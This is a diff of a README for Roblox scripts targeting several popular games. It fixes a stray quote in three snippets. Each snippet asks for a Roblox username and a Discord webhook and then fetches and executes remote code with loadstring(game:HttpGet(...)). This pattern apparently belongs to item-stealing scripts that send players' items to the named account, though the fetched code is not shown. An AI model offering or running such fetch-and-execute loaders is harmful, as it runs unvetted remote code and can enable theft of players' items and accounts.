@@ -20,19 +20,19 @@ Please use these scripts responsibly and in accordance with Roblox's terms of se
 ```lua
 Username = "Your Roblox Username Here"
 Webhook = "Your Discord Webhook Here"
-loadstring(game:HttpGet("adopt",true))()"
+loadstring(game:HttpGet("adopt",true))()
 ```
 **Murder Mystery 2** 🔫
 ```lua
 Username = "Your Roblox Username Here"
 Webhook = "Your Discord Webhook Here"
-loadstring(game:HttpGet("murder",true))()"
+loadstring(game:HttpGet("murder",true))()
 ```
 **Pet Simulator 99** 🐶
 ```lua
 Username = "Your Roblox Username Here"
 Webhook = "Your Discord Webhook Here"
-loadstring(game:HttpGet("pet",true))()"
+loadstring(game:HttpGet("pet",true))()
 ```
 
 ## Installation Instructions 📩
